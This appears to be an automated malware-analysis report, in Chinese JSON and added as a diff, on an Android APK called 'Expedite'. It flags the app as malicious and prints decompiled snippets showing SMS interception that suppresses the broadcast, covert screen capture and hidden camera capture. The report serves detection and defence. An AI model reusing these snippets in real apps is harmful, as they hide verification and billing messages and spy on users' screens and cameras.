@@ -1,0 +1,129 @@
+{
+  "APK信息": {
+    "文件名": "34ed14b536e8028d4d1aba4e1c114cf7ba76df97dff86a0385341ef9f3d603b1.apk",
+    "sha256": "34ed14b536e8028d4d1aba4e1c114cf7ba76df97dff86a0385341ef9f3d603b1",
+    "包名": "com.mob.expedite",
+    "应用名": "Expedite",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 720.5
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\mob\\expedite\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) { abortBroadcast(); Bundle extras = intent.getExtras(); if (extras != null) { Object[] objArr = (Object[]) extras.get(\"pdus\"); SmsMessage[] smsMessageArr = new SmsMessage[objArr.length]; for (int i = 0; i < objArr.length; i++) { smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]); } for (SmsMessage smsMessage : smsMessageArr) { smsMessage.getDisplayOriginatingAddress(); } }",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n              abortBroadcast();\n              new StringBuilder();\n              Bundle extras = intent.getExtras();",
+          "behavior_description": "该 BroadcastReceiver 监听系统短信广播 SMS_RECEIVED，收到短信后立即调用 abortBroadcast() 终止广播继续传递，导致系统短信应用无法收到并显示短信。随后从 intent 的 extras 中提取 pdus 数据并解析为 SmsMessage 对象，读取发送方号码和短信内容。数据流向：系统短信广播 Intent（source）→ abortBroadcast() 终止广播 + 解析短信PDU提取号码和内容（sink）。这种短信拦截行为可隐藏验证码、银行通知、扣费确认等短信，用于配合恶意注册、盗刷账户或隐藏扣费。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "createVirtualDisplay"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\swipe\\fanmenu\\services\\ScreenShotService;",
+          "method_signature": "g()",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.a = f().getMediaProjection(-1, c);\nthis.b = this.a.createVirtualDisplay(\"screen-mirror\", this.e, this.f, this.g, 16, this.d.getSurface(), null, null);\nImage acquireLatestImage = this.d.acquireLatestImage();\nAsyncTaskCompat.executeParallel(new b(), acquireLatestImage);",
+          "malicious_code_snippet_context": "              startActivity(intent);\n              return;\n          }\n>>>         this.a = f().getMediaProjection(-1, c);\n>>>     }\n>>> \n>>>     private MediaProjectionManager f() {\n          return (MediaProjectionManager) getSystemService(\"media_projection\");\n      }\n  ",
+          "behavior_description": "代码通过MediaProjectionManager获取屏幕投影权限，创建VirtualDisplay进行屏幕镜像捕获，再通过ImageReader.acquireLatestImage()获取屏幕帧图像数据，并将捕获的图像传递给异步任务处理（可能用于上传到C2服务器或本地保存）。该行为在恶意样本中通常用于监控用户屏幕活动、窃取敏感信息（如银行登录界面、验证码等）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "android.media.action.IMAGE_CAPTURE",
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lsps\\ceg;",
+          "method_signature": "if(this.c != null && !this.c.isRecycled()",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "cea.a(\"takePicture\").a(new Runnable() {\n    public void run() {\n        Looper.prepare();\n        ceg.this.a = surfaceView.getHolder();\n        ceg.this.a.setType(3);\n        ceg.this.a(ceg.this.a);\n    }\n});",
+          "malicious_code_snippet_context": "              this.c.recycle();\n              this.c = null;\n          }\n>>>         cea.a(\"takePicture\").a(new Runnable() { // from class: sps.ceg.1\n>>>             @Override // java.lang.Runnable\n>>>             public void run() {\n>>>                 Looper.prepare();\n>>>                 try {\n>>>                     ceg.this.a = surfaceView.getHolder();\n>>>                     ceg.this.a.setType(3);\n>>>                     ceg.this.a(ceg.this.a);\n                  } catch (Exception e) {\n                      e.printStackTrace();\n                      ceg.this.h = true;",
+          "behavior_description": "该代码在后台线程中通过Runnable秘密初始化摄像头预览并触发拍照操作。代码通过cea.a(\"takePicture\")发起拍照指令，在子线程中调用Looper.prepare()创建独立消息循环，随后通过SurfaceView.getHolder()获取摄像头SurfaceHolder，设置类型为PUSH_BUFFERS(3)，并调用自定义方法a()完成摄像头初始化和拍照。整个过程在后台线程中隐蔽执行，无用户可见界面或提示，属于典型的秘密摄像头调用行为，可能导致用户隐私画面被窃取。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
